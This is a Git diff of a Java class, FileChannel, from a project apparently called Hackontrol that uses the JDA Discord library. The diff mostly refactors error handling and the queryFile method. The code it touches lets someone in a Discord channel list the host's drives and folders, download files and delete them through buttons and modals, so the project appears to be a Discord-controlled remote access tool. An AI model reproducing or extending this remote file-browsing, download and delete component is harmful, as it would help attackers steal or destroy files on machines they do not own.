@@ -10,14 +10,14 @@ import java.util.Stack;
 import com.khopan.hackontrol.HackontrolChannel;
 import com.khopan.hackontrol.manager.button.ButtonContext;
 import com.khopan.hackontrol.manager.button.ButtonManager;
-import com.khopan.hackontrol.manager.common.IReplyHandler;
+import com.khopan.hackontrol.manager.common.sender.IMessageable;
+import com.khopan.hackontrol.manager.common.sender.IRepliable;
+import com.khopan.hackontrol.manager.common.sender.sendable.ReplySendable;
 import com.khopan.hackontrol.manager.modal.ModalContext;
 import com.khopan.hackontrol.manager.modal.ModalManager;
 import com.khopan.hackontrol.registry.Registry;
-import com.khopan.hackontrol.utils.DiscordUtils;
-import com.khopan.hackontrol.utils.ErrorUtils;
+import com.khopan.hackontrol.utils.HackontrolError;
 
-import net.dv8tion.jda.api.entities.channel.middleman.MessageChannel;
 import net.dv8tion.jda.api.interactions.components.ActionRow;
 import net.dv8tion.jda.api.interactions.components.ItemComponent;
 import net.dv8tion.jda.api.interactions.components.buttons.ButtonStyle;
@@ -65,7 +65,7 @@ public class FileChannel extends HackontrolChannel {
 		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, FileChannel.QUERY_FILE_BUTTON_IDENTIFIER, context -> {
 			this.filePointer = null;
 			this.directoryStack.clear();
-			this.queryFile(context, context.getChannel());
+			this.queryFile(context);
 		});
 
 		registry.register(ModalManager.MODAL_REGISTRY, FileChannel.VIEW_FILE_MODAL_IDENTIFIER, this :: modalCallbackViewFile);
@@ -79,13 +79,13 @@ public class FileChannel extends HackontrolChannel {
 
 	private void returnCallback(ButtonContext context) {
 		if(this.directoryStack.isEmpty()) {
-			ErrorUtils.sendErrorReply(context, new InternalError("Stack is empty"));
+			HackontrolError.message(context.reply(), "File navigation stack is empty");
 			return;
 		}
 
 		File lastItem = this.directoryStack.pop();
 		this.filePointer = lastItem;
-		this.queryFile(context, context.getChannel());
+		this.queryFile(context);
 		context.getChannel().deleteMessageById(context.getEvent().getMessageIdLong()).queue();
 		ButtonManager.deleteMessagesInParameters(context);
 	}
@@ -104,7 +104,7 @@ public class FileChannel extends HackontrolChannel {
 
 	private void downloadFile(File file, ButtonContext context) {
 		if(!file.exists()) {
-			DiscordUtils.selfDeleteMessage(context.reply(), "File '" + file.getAbsolutePath() + "' does not exist");
+			HackontrolError.message(context.reply(), "File '" + file.getAbsolutePath() + "' does not exist");
 			return;
 		}
 
@@ -113,12 +113,12 @@ public class FileChannel extends HackontrolChannel {
 
 	private void deleteFile(File file, ButtonContext context) {
 		if(!file.exists()) {
-			DiscordUtils.selfDeleteMessage(context.reply(), "File '" + file.getAbsolutePath() + "' does not exist");
+			HackontrolError.message(context.reply(), "File '" + file.getAbsolutePath() + "' does not exist");
 			return;
 		}
 
 		if(!file.delete()) {
-			DiscordUtils.selfDeleteMessage(context.reply(), "Error while deleting a file");
+			HackontrolError.message(context.reply(), "Error while deleting a file");
 			return;
 		}
 
@@ -135,7 +135,7 @@ public class FileChannel extends HackontrolChannel {
 		FileEntry entry = this.fileList.get(index - 1);
 		this.directoryStack.push(this.filePointer);
 		this.filePointer = entry.file;
-		this.queryFile(context, context.getEvent().getChannel());
+		this.queryFile(context);
 
 		if(this.goIntoContext != null) {
 			this.goIntoContext.getChannel().deleteMessageById(this.goIntoContext.getEvent().getMessageIdLong()).queue();
@@ -147,7 +147,7 @@ public class FileChannel extends HackontrolChannel {
 		ModalMapping mapping = context.value("fileIndex");
 
 		if(mapping == null) {
-			ErrorUtils.sendErrorReply(context, new InternalError("File index cannot be null"));
+			HackontrolError.message(context.reply(), "File index cannot be null");
 			return -1;
 		}
 
@@ -157,12 +157,12 @@ public class FileChannel extends HackontrolChannel {
 		try {
 			index = Integer.parseInt(text);
 		} catch(Throwable Errors) {
-			context.reply("Invalid number format").addActionRow(ButtonManager.selfDelete(ButtonStyle.DANGER, "Delete")).queue();
+			HackontrolError.message(context.reply(), "Invalid number format");
 			return -1;
 		}
 
 		if(index < start || index > end) {
-			context.reply("Index " + index + " out of bounds, expected " + start + " - " + end).addActionRow(ButtonManager.selfDelete(ButtonStyle.DANGER, "Delete")).queue();
+			HackontrolError.message(context.reply(), "Index " + index + " out of bounds, expected " + start + " - " + end);
 			return -1;
 		}
 
@@ -197,13 +197,13 @@ public class FileChannel extends HackontrolChannel {
 		request.addActionRow(list);
 	}
 
-	private void queryFile(IReplyHandler handler, MessageChannel channel) {
+	private <T extends IRepliable & IMessageable> void queryFile(T sender) {
 		StringBuilder builder = new StringBuilder();
 		boolean root = this.filePointer == null;
 		File[] files = root ? File.listRoots() : this.filePointer.listFiles();
 
 		if(files == null || files.length == 0) {
-			ErrorUtils.sendErrorReply(handler, new InternalError("Empty file list"));
+			HackontrolError.message(ReplySendable.of(sender), "Empty file list");
 			return;
 		}
 
@@ -227,7 +227,7 @@ public class FileChannel extends HackontrolChannel {
 		}
 
 		if(fileList.isEmpty() && folderList.isEmpty()) {
-			ErrorUtils.sendErrorReply(handler, new InternalError("No files available"));
+			HackontrolError.message(ReplySendable.of(sender), "No files available");
 			return;
 		}
 
@@ -297,13 +297,13 @@ public class FileChannel extends HackontrolChannel {
 				messageList.add(builder.toString());
 			}
 		} catch(Throwable Errors) {
-			ErrorUtils.sendErrorReply(handler, Errors);
+			HackontrolError.throwable(ReplySendable.of(sender), Errors);
 			return;
 		}
 
 		String firstBatch = messageList.get(0);
 		messageList.remove(0);
-		ReplyCallbackAction replyCallbackAction = handler.reply(firstBatch);
+		ReplyCallbackAction replyCallbackAction = sender.reply(firstBatch);
 
 		if(messageList.isEmpty()) {
 			this.configActionRow(replyCallbackAction, root);
@@ -318,17 +318,17 @@ public class FileChannel extends HackontrolChannel {
 				MessageCreateAction messageCreateAction;
 
 				if(size == 1) {
-					messageCreateAction = channel.sendMessage(messageList.get(0));
+					messageCreateAction = sender.sendMessage(messageList.get(0));
 					this.configActionRow(messageCreateAction, root, message.getIdLong());
 				} else {
 					Object[] identifierList = new Object[size];
 					identifierList[0] = message.getIdLong();
 
 					for(int i = 1; i < size; i++) {
-						identifierList[i] = channel.sendMessage(messageList.get(i - 1)).complete().getIdLong();
+						identifierList[i] = sender.sendMessage(messageList.get(i - 1)).complete().getIdLong();
 					}
 
-					messageCreateAction = channel.sendMessage(messageList.get(size - 1));
+					messageCreateAction = sender.sendMessage(messageList.get(size - 1));
 					this.configActionRow(messageCreateAction, root, identifierList);
 				}
 
